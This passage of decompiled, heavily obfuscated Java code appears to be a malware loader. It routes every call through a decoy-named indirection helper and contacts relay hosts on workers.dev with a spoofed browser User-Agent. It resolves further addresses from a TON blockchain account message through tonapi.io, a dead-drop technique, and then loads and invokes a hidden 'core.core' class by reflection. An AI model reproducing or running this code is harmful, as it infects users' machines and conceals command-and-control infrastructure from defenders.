                        object = sherbet.mobile("roast", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 18586319, 1, (StringBuilder)((Object)sherbet.mobile("digital", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 487202309, 1, (StringBuilder)((Object)sherbet.mobile("siren", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 449106381, 1, (StringBuilder)((Object)sherbet.mobile("candle", "java/lang/StringBuilder|<init>|()V", 385588366, 2)), (Object)object3)), (String)"/api/hlam/files/4001")));
                    }
                    sherbet.mobile("plato", "java/util/LinkedHashSet|add|(Ljava/lang/Object;)Z", 302887065, 1, (LinkedHashSet)((Object)callSite), (Object)object);
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }
        stringArray = sherbet.mobile("beacon", "java/util/ArrayList|<init>|()V", 430488607, 2);
        String[] stringArray2 = sherbet.mobile("ledger", "java/util/LinkedHashSet|iterator|()Ljava/util/Iterator;", 230611460, 1, (LinkedHashSet)((Object)callSite));
        while (sherbet.mobile("stallion", "java/util/Iterator|hasNext|()Z", 115340434, 1, (Iterator)stringArray2) != false) {
            String string = (String)((Object)sherbet.mobile("mallet", "java/util/Iterator|next|()Ljava/lang/Object;", 66116363, 1, (Iterator)stringArray2));
            if (sherbet.mobile("digital", "java/util/List|contains|(Ljava/lang/Object;)Z", 315542777, 1, (List)stringArray, (Object)string) == false) {
                sherbet.mobile("shanty", "java/util/List|add|(Ljava/lang/Object;)Z", 535423438, 1, (List)stringArray, (Object)string);
            }
            CallSite callSite2 = sherbet.mobile("orange", "java/util/List|iterator|()Ljava/util/Iterator;", 319722944, 1, rattle.kingdom(string));
            while (sherbet.mobile("nectar", "java/util/Iterator|hasNext|()Z", 447607211, 1, (Iterator)((Object)callSite2)) != false) {
                String string2;
                string2 = (String)((Object)sherbet.mobile("hornet", "java/util/Iterator|next|()Ljava/lang/Object;", 27452391, 1, (Iterator)((Object)callSite2)));
                if (sherbet.mobile("joker", "java/util/List|contains|(Ljava/lang/Object;)Z", 352514031, 1, (List)stringArray, (Object)string2) != false) continue;
                sherbet.mobile("niece", "java/util/List|add|(Ljava/lang/Object;)Z", 349430932, 1, (List)stringArray, (Object)string2);
            }
        }
        return stringArray;
    }

    private static String gadget() {
        List<String> list;
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        return sherbet.mobile("pomegranate", "java/util/List|isEmpty|()Z", 367047558, 1, list = rattle.apple()) != false ? null : (String)((Object)sherbet.mobile("sabre", "java/util/List|get|(I)Ljava/lang/Object;", 243910360, 1, list, 0));
    }

    private static List<String> napkin(String string) {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        CallSite callSite = sherbet.mobile("sherbet", "java/util/ArrayList|<init>|()V", 403102493, 2);
        if (string == null) {
            return callSite;
        }
        for (CallSite callSite2 : sherbet.mobile("rodeo", "java/lang/String|split|(Ljava/lang/String;)[Ljava/lang/String;", 280406455, 1, (String)string, (String)",")) {
            CallSite callSite3 = sherbet.mobile("samba", "java/lang/String|trim|()Ljava/lang/String;", 521845908, 1, (String)((Object)callSite2));
            if (sherbet.mobile("mobile", "java/lang/String|isEmpty|()Z", 479902134, 1, (String)((Object)callSite3)) != false || sherbet.mobile("rambler", "java/lang/String|startsWith|(Ljava/lang/String;)Z", 368633365, 1, (String)((Object)callSite3), (String)"http") == false || sherbet.mobile("rosewood", "java/util/List|contains|(Ljava/lang/Object;)Z", 11794440, 1, (List)((Object)callSite), (Object)callSite3) != false) continue;
            sherbet.mobile("reef", "java/util/List|add|(Ljava/lang/Object;)Z", 231444472, 1, (List)((Object)callSite), (Object)callSite3);
        }
        return callSite;
    }

    private static List<String> kingdom(String string) {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        CallSite callSite = sherbet.mobile("kipper", "java/util/ArrayList|<init>|()V", 520886923, 2);
        try {
            CallSite callSite2 = sherbet.mobile("postbox", "java/net/URL|<init>|(Ljava/lang/String;)V", 150335445, 2, (String)string);
            if (sherbet.mobile("odyssey", "java/lang/String|endsWith|(Ljava/lang/String;)Z", 445883379, 1, (String)((Object)sherbet.mobile("nimble", "java/net/URL|getHost|()Ljava/lang/String;", 479067085, 1, (URL)((Object)callSite2))), (String)".workers.dev") == false) {
                return callSite;
            }
            CallSite callSite3 = sherbet.mobile("lilac", "java/net/URL|getFile|()Ljava/lang/String;", 318309596, 1, (URL)((Object)callSite2));
            for (String string2 : new String[]{"https://relay-3f9c71.kartohaantoha36-6a9.workers.dev", "https://relay-mirror.kartohaantoha36-6a9.workers.dev"}) {
                CallSite callSite4 = callSite3;
                String string3 = string2;
                CallSite callSite5 = sherbet.mobile("beetle", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 498180267, 1, (StringBuilder)((Object)sherbet.mobile("marina", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 261660814, 1, (StringBuilder)((Object)sherbet.mobile("sapphire", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 487574969, 1, (StringBuilder)((Object)sherbet.mobile("pomegranate", "java/lang/StringBuilder|<init>|()V", 176471465, 2)), (Object)string3)), (Object)callSite4)));
                if (sherbet.mobile("sabre", "java/lang/String|equals|(Ljava/lang/Object;)Z", 368442321, 1, (String)((Object)callSite5), (Object)string) != false || sherbet.mobile("basket", "java/util/List|contains|(Ljava/lang/Object;)Z", 166371745, 1, (List)((Object)callSite), (Object)callSite5) != false) continue;
                sherbet.mobile("jasper", "java/util/List|add|(Ljava/lang/Object;)Z", 261003803, 1, (List)((Object)callSite), (Object)callSite5);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return callSite;
    }

    private static String remark(String string, String string2) {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        try {
            String string3 = string2;
            CallSite callSite = sherbet.mobile("medal", "java/util/regex/Pattern|matcher|(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;", 411404282, 1, (Pattern)((Object)sherbet.mobile("rapids", "java/util/regex/Pattern|compile|(Ljava/lang/String;)Ljava/util/regex/Pattern;", 453886378, 0, (String)((Object)sherbet.mobile("reveal", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 216912106, 1, (StringBuilder)((Object)sherbet.mobile("pepper", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 330410118, 1, (StringBuilder)((Object)sherbet.mobile("pomegranate", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 43500960, 1, (StringBuilder)((Object)sherbet.mobile("raccoon", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 470471576, 1, (StringBuilder)((Object)sherbet.mobile("filter", "java/lang/StringBuilder|<init>|()V", 248891885, 2)), (String)"\"")), (Object)string3)), (String)"\"\\s*:\\s*\"([^\"]+)\"")))))), (CharSequence)string);
            if (sherbet.mobile("magnet", "java/util/regex/Matcher|find|()Z", 445888502, 1, (Matcher)((Object)callSite)) != false) {
                return sherbet.mobile("organ", "java/util/regex/Matcher|group|(I)Ljava/lang/String;", 2144209361, 1, (Matcher)((Object)callSite), 1);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return null;
    }

    private static String canvas(String string, int n) {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection)((Object)sherbet.mobile("stork", "java/net/URL|openConnection|()Ljava/net/URLConnection;", 2139199479, 1, (URL)((Object)sherbet.mobile("meadow", "java/net/URL|<init>|(Ljava/lang/String;)V", 149140243, 2, (String)string))));
            sherbet.mobile("oriole", "java/net/HttpURLConnection|setRequestMethod|(Ljava/lang/String;)V", 518266586, 1, (HttpURLConnection)httpURLConnection, (String)"GET");
            sherbet.mobile("chimney", "java/net/HttpURLConnection|setRequestProperty|(Ljava/lang/String;Ljava/lang/String;)V", 378926758, 1, (HttpURLConnection)httpURLConnection, (String)"User-Agent", (String)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
            sherbet.mobile("raccoon", "java/net/HttpURLConnection|setConnectTimeout|(I)V", 312068828, 1, (HttpURLConnection)httpURLConnection, n);
            sherbet.mobile("prism", "java/net/HttpURLConnection|setReadTimeout|(I)V", 260838424, 1, (HttpURLConnection)httpURLConnection, n);
            CallSite callSite = sherbet.mobile("iris", "java/net/HttpURLConnection|getResponseCode|()I", 269925327, 1, (HttpURLConnection)httpURLConnection);
            if (callSite != 200) {
                sherbet.mobile("koala", "java/net/HttpURLConnection|disconnect|()V", 112378647, 1, (HttpURLConnection)httpURLConnection);
                return null;
            }
            CallSite callSite2 = sherbet.mobile("pagoda", "java/net/HttpURLConnection|getInputStream|()Ljava/io/InputStream;", 482070789, 1, (HttpURLConnection)httpURLConnection);
            CallSite callSite3 = sherbet.mobile("palette", "java/io/InputStream|readAllBytes|()[B", 244365844, 1, (InputStream)((Object)callSite2));
            sherbet.mobile("feather", "java/net/HttpURLConnection|disconnect|()V", 2140851717, 1, (HttpURLConnection)httpURLConnection);
            return sherbet.mobile("eagle", "java/lang/String|<init>|([BLjava/nio/charset/Charset;)V", 132753935, 2, (byte[])callSite3, (Charset)((Object)sherbet.mobile("smoke", "java/nio/charset/StandardCharsets|UTF_8|()Ljava/nio/charset/Charset;", 463595958, 4)));
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static void ripple(Object object, String string, String string2, String string3, String string4) throws ReflectiveOperationException {
        CallSite callSite;
        CallSite callSite2;
        int n;
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        CallSite callSite3 = sherbet.mobile("bronze", "java/lang/ClassLoader|loadClass|(Ljava/lang/String;)Ljava/lang/Class;", 366805942, 1, (Object)object, (String)"core.core");
        CallSite callSite4 = null;
        CallSite callSite5 = sherbet.mobile("stealth", "java/lang/Class|getDeclaredMethods|()[Ljava/lang/reflect/Method;", 183147696, 1, (Class)((Object)callSite3));
        int n2 = ((CallSite)callSite5).length;
        for (n = 0; n < n2; ++n) {
            callSite2 = callSite5[n];
            callSite = sherbet.mobile("mailman", "java/lang/reflect/Method|getParameterTypes|()[Ljava/lang/Class;", 61085354, 1, (Method)((Object)callSite2));
            if (((CallSite)callSite).length != 4 || callSite[0] != String.class || callSite[1] != String.class || callSite[2] != String.class || callSite[3] != String.class) continue;
            callSite4 = callSite2;
            break;
        }
        if (callSite4 == null) {
            callSite5 = sherbet.mobile("circle", "java/lang/Class|getDeclaredMethods|()[Ljava/lang/reflect/Method;", 260146853, 1, (Class)((Object)callSite3));
            n2 = ((CallSite)callSite5).length;
            for (n = 0; n < n2; ++n) {
                callSite2 = callSite5[n];
                callSite = sherbet.mobile("blossom", "java/lang/reflect/Method|getParameterTypes|()[Ljava/lang/Class;", 386461170, 1, (Method)((Object)callSite2));
                if (((CallSite)callSite).length != 5 || callSite[0] != String.class || callSite[1] != String.class || callSite[2] != String.class || callSite[3] != String.class || callSite[4] != sherbet.mobile("oregano", "java/lang/Integer|TYPE|()Ljava/lang/Class;", 348304861, 4) && callSite[4] != Integer.class) continue;
                callSite4 = callSite2;
                break;
            }
        }
        if (callSite4 == null) {
            CallSite callSite6 = sherbet.mobile("bottle", "java/lang/Class|getName|()Ljava/lang/String;", 96148376, 1, (Class)((Object)callSite3));
            throw sherbet.mobile("sturdy", "java/lang/NoSuchMethodException|<init>|(Ljava/lang/String;)V", 82816512, 2, (String)((Object)sherbet.mobile("cypress", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 65997239, 1, (StringBuilder)((Object)sherbet.mobile("sabre", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 534388158, 1, (StringBuilder)((Object)sherbet.mobile("prairie", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 169257447, 1, (StringBuilder)((Object)sherbet.mobile("island", "java/lang/StringBuilder|<init>|()V", 217615852, 2)), (String)"No (String,String,String,String) or (String,String,String,String,int) in ")), (Object)callSite6)))));
        }
        sherbet.mobile("meadow", "java/lang/reflect/Method|setAccessible|(Z)V", 285801746, 1, callSite4, (boolean)true);
        CallSite callSite7 = callSite5 = sherbet.mobile("piranha", "java/lang/reflect/Modifier|isStatic|(I)Z", 218805451, 0, (int)sherbet.mobile("potato", "java/lang/reflect/Method|getModifiers|()I", 243636225, 1, callSite4)) != false ? null : sherbet.mobile("raven", "java/lang/reflect/Constructor|newInstance|([Ljava/lang/Object;)Ljava/lang/Object;", 484498163, 1, (Constructor)((Object)sherbet.mobile("storm", "java/lang/Class|getDeclaredConstructor|([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;", 229575413, 1, (Class)((Object)callSite3), (Class[])new Class[0])), (Object[])new Object[0]);
        if (sherbet.mobile("ripple", "java/lang/reflect/Method|getParameterCount|()I", 227010006, 1, callSite4) == 4) {
            sherbet.mobile("atlas", "java/lang/reflect/Method|invoke|(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", 400550392, 1, (Method)((Object)callSite4), (Object)callSite5, (Object[])new Object[]{string, string2, string3, string4});
        } else {
            sherbet.mobile("linen", "java/lang/reflect/Method|invoke|(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", 94439566, 1, (Method)((Object)callSite4), (Object)callSite5, (Object[])new Object[]{string, string2, string3, string4, sherbet.mobile("nourish", "java/lang/Integer|valueOf|(I)Ljava/lang/Integer;", 112952043, 0, 0)});
        }
    }

    private static String kayak(String string) {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        return string == null ? "" : sherbet.mobile("medal", "java/lang/String|replace|(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;", 184220660, 1, (String)((Object)sherbet.mobile("hickory", "java/lang/String|replace|(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;", 480027524, 1, (String)((Object)sherbet.mobile("humble", "java/lang/String|replace|(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;", 433694445, 1, (String)((Object)sherbet.mobile("laptop", "java/lang/String|replace|(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;", 166904588, 1, (String)string, (CharSequence)"\\", (CharSequence)"\\\\")), (CharSequence)"\"", (CharSequence)"\\\"")), (CharSequence)"\n", (CharSequence)"\\n")), (CharSequence)"\r", (CharSequence)"");
    }

    private static byte[] dragon(String string) {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        byte[] byArray = new byte[sherbet.mobile("nimbus", "java/lang/String|length|()I", 351346608, 1, (String)string) / 2];
        for (int i = 0; i < byArray.length; ++i) {
            byArray[i] = (byte)(sherbet.mobile("pumice", "java/lang/Character|digit|(CI)I", 18808802, 0, (char)sherbet.mobile("fragment", "java/lang/String|charAt|(I)C", 234151553, 1, (String)string, i * 2), 16) << 4 | sherbet.mobile("rivet", "java/lang/Character|digit|(CI)I", 470007006, 0, (char)sherbet.mobile("bishop", "java/lang/String|charAt|(I)C", 421258771, 1, (String)string, i * 2 + 1), 16));
        }
        return byArray;
    }

    private static long hollow(byte[] byArray, int n, int n2) {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        long l = 0L;
        for (int i = 0; i < n2; ++i) {
            l = l << 8 | (long)byArray[n + i] & (long)255;
        }
        return l;
    }

    private static String savanna(String string) {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        byte[] byArray = rattle.dragon(string);
        int n = 4;
        int n2 = byArray[n++] & 0xFF;
        int n3 = n2 & 7;
        int n4 = byArray[n++] & 0xFF;
        int n5 = (int)rattle.hollow(byArray, n, n3);
        int n6 = (int)rattle.hollow(byArray, n += n3, n3);
        n += n3;
        n += n3 + n4 + n6 * n3;
        if ((n2 & 0x80) != 0) {
            n += n5 * n4;
        }
        int n7 = ++n;
        int n8 = byArray[n7] & 0xFF;
        int n9 = (n8 + 1) / 2;
        return sherbet.mobile("ember", "java/lang/String|<init>|([BIILjava/nio/charset/Charset;)V", 118328470, 2, (byte[])byArray, ++n, (int)n9, (Charset)((Object)sherbet.mobile("gadget", "java/nio/charset/StandardCharsets|UTF_8|()Ljava/nio/charset/Charset;", 2140598429, 4)));
    }

    private static String stork(InputStream inputStream) throws IOException {
        CallSite callSite;
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        CallSite callSite2 = sherbet.mobile("lobster", "java/io/ByteArrayOutputStream|<init>|()V", 2147416803, 2);
        byte[] byArray = new byte[8192];
        while ((callSite = sherbet.mobile("ladder", "java/io/InputStream|read|([B)I", 92313728, 1, (InputStream)inputStream, (byte[])byArray)) != -1) {
            sherbet.mobile("filter", "java/io/ByteArrayOutputStream|write|([BII)V", 336920756, 1, (ByteArrayOutputStream)((Object)callSite2), (byte[])byArray, (int)0, (int)callSite);
        }
        return sherbet.mobile("gallon", "java/lang/String|<init>|([BLjava/nio/charset/Charset;)V", 148360934, 2, (byte[])sherbet.mobile("savanna", "java/io/ByteArrayOutputStream|toByteArray|()[B", 353276352, 1, (ByteArrayOutputStream)((Object)callSite2)), (Charset)((Object)sherbet.mobile("coyote", "java/nio/charset/Charset|defaultCharset|()Ljava/nio/charset/Charset;", 161396228, 0)));
    }

    public static String mohair(String string) {
        if (stumble.marina() != 0) {
            stumble.dune();
        }
        try {
            String string2 = string;
            CallSite callSite = sherbet.mobile("pattern", "java/lang/StringBuilder|toString|()Ljava/lang/String;", 165015797, 1, (StringBuilder)((Object)sherbet.mobile("samba", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 66325444, 1, (StringBuilder)((Object)sherbet.mobile("mosaic", "java/lang/StringBuilder|append|(Ljava/lang/Object;)Ljava/lang/StringBuilder;", 495570352, 1, (StringBuilder)((Object)sherbet.mobile("stealth", "java/lang/StringBuilder|append|(Ljava/lang/String;)Ljava/lang/StringBuilder;", 412986577, 1, (StringBuilder)((Object)sherbet.mobile("oriole", "java/lang/StringBuilder|<init>|()V", 464051990, 2)), (String)"https://tonapi.io/v2/blockchain/accounts/")), (Object)string2)), (String)"/methods/getMessage")));
            HttpURLConnection httpURLConnection = (HttpURLConnection)((Object)sherbet.mobile("hammer", "java/net/URL|openConnection|()Ljava/net/URLConnection;", 202619284, 1, (URL)((Object)sherbet.mobile("mulberry", "java/net/URL|<init>|(Ljava/lang/String;)V", 64721077, 2, (String)((Object)callSite)))));
            sherbet.mobile("orchid", "java/net/HttpURLConnection|setRequestMethod|(Ljava/lang/String;)V", 215393027, 1, (HttpURLConnection)httpURLConnection, (String)"GET");
            sherbet.mobile("spruce", "java/net/HttpURLConnection|setRequestProperty|(Ljava/lang/String;Ljava/lang/String;)V", 159753648, 1, (HttpURLConnection)httpURLConnection, (String)"Accept", (String)"application/json");
            sherbet.mobile("gypsum", "java/net/HttpURLConnection|setConnectTimeout|(I)V", 327596718, 1, (HttpURLConnection)httpURLConnection, 15000);
            sherbet.mobile("humble", "java/net/HttpURLConnection|setReadTimeout|(I)V", 263392766, 1, (HttpURLConnection)httpURLConnection, 30000);
            CallSite callSite2 = sherbet.mobile("carbon", "java/net/HttpURLConnection|getResponseCode|()I", 383551204, 1, (HttpURLConnection)httpURLConnection);
            CallSite callSite3 = callSite2 >= 200 && callSite2 < 300 ? sherbet.mobile("figment", "java/net/HttpURLConnection|getInputStream|()Ljava/io/InputStream;", 505328012, 1, (HttpURLConnection)httpURLConnection) : sherbet.mobile("silver", "java/net/HttpURLConnection|getErrorStream|()Ljava/io/InputStream;", 129034721, 1, (HttpURLConnection)httpURLConnection);
            String string3 = rattle.stork((InputStream)((Object)callSite3));
            CallSite callSite4 = sherbet.mobile("jelly", "java/util/regex/Pattern|matcher|(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;", 381322462, 1, (Pattern)laptop, (CharSequence)string3);
            if (sherbet.mobile("grape", "java/util/regex/Matcher|find|()Z", 529141150, 1, (Matcher)((Object)callSite4)) != false) {
                sherbet.mobile("harvest", "java/net/HttpURLConnection|disconnect|()V", 434945461, 1, (HttpURLConnection)httpURLConnection);
                return rattle.savanna((String)((Object)sherbet.mobile("daisy", "java/util/regex/Matcher|group|(I)Ljava/lang/String;", 169055770, 1, (Matcher)((Object)callSite4), 1)));
            }
            sherbet.mobile("ruby", "java/net/HttpURLConnection|disconnect|()V", 331476958, 1, (HttpURLConnection)httpURLConnection);
        }
        catch (Exception exception) {
            // empty catch block
        }
        return null;
    }
}

